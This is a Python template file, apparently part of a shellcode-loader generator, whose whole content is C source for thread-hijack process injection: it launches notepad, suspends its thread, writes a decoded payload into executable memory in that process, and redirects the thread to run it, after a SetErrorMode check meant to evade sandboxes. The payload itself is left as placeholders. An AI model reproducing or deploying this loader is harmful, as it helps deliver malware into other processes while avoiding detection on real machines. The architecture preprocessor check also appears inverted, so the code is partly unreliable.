###"Technical principle: https://idiotc4t.com/code-and-dll-process-injection/setcontext-hijack-thread"
from templates.template import *
class template(ITemplate):
    @staticmethod
    def get():
        c_code = '''
#include<windows.h>
#include<stdio.h>

<TABLES>
int main(){

  DWORD dwCode ;
  dwCode = SetErrorMode(0x400);
  dwCode = SetErrorMode(0x0);
  if (dwCode != 0x400)
  {
    return 0;
  }
                
	PCHAR lpBuffer = <ALLOC>
    <DECODE>
	STARTUPINFOA si = { 0 };
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = {0};

	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
	SuspendThread(pi.hThread);
	LPVOID Buffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(offset_table), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, Buffer, lpBuffer, sizeof(offset_table), NULL);
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_ALL;
	GetThreadContext(pi.hThread, &ctx);
#ifndef WIN32
    ctx.Eip = (DWORD32)Buffer;
#elif WIN64
    ctx.Rip = (DWORD64)Buffer;
#endif
	SetThreadContext(pi.hThread, &ctx);
	ResumeThread(pi.hThread);
	return 0;
}    
'''
        return c_code

